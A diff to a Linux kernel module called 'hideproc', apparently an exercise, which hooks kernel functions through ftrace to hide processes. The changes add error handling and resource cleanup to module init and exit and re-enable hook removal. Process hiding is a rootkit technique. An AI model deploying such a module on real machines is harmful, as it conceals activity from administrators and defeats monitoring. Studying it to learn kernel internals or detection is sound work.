@@ -63,7 +63,7 @@ static int hook_install(struct ftrace_hook *hook)
     return 0;
 }
 
-#if 0
+
 void hook_remove(struct ftrace_hook *hook)
 {
     int err = unregister_ftrace_function(&hook->ops);
@@ -73,7 +73,6 @@ void hook_remove(struct ftrace_hook *hook)
     if (err)
         printk("ftrace_set_filter_ip() failed: %d\n", err);
 }
-#endif
 
 typedef struct {
     pid_t id;
@@ -197,7 +196,7 @@ static ssize_t device_write(struct file *filep,
 
 static struct cdev cdev;
 static struct class *hideproc_class = NULL;
-
+static dev_t dev;
 static const struct file_operations fops = {
     .owner = THIS_MODULE,
     .open = device_open,
@@ -211,27 +210,43 @@ static const struct file_operations fops = {
 
 static int _hideproc_init(void)
 {
-    int err, dev_major;
-    dev_t dev;
+    int dev_major;
+    struct device *device = NULL;
     printk(KERN_INFO "@ %s\n", __func__);
-    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
+    if (0 != alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME) )
+        goto fail_hideproc_init;
+
     dev_major = MAJOR(dev);
 
     hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);
+    if(NULL == hideproc_class)
+        goto fail_hideproc_init;
 
     cdev_init(&cdev, &fops);
-    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
-    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
+    if(0 != cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1))
+         goto fail_hideproc_init_cdev_add;
+    device = device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                   DEVICE_NAME);
-
+    if (NULL == device)
+        goto fail_hideproc_init_dev_create;
     init_hook();
-
     return 0;
+fail_hideproc_init_dev_create:
+    cdev_del(&cdev);
+fail_hideproc_init_cdev_add:
+    class_destroy(hideproc_class);
+fail_hideproc_init:
+    return -1;
 }
 
 static void _hideproc_exit(void)
 {
     printk(KERN_INFO "@ %s\n", __func__);
+    hook_remove(&hook);
+    device_destroy(hideproc_class, MKDEV(MAJOR(dev), MINOR_VERSION));
+    class_destroy(hideproc_class);
+    cdev_del(&cdev);
+    unregister_chrdev_region(MKDEV(MAJOR(dev), MINOR_VERSION), 1);
     /* FIXME: ensure the release of all allocated resources */
 }
 
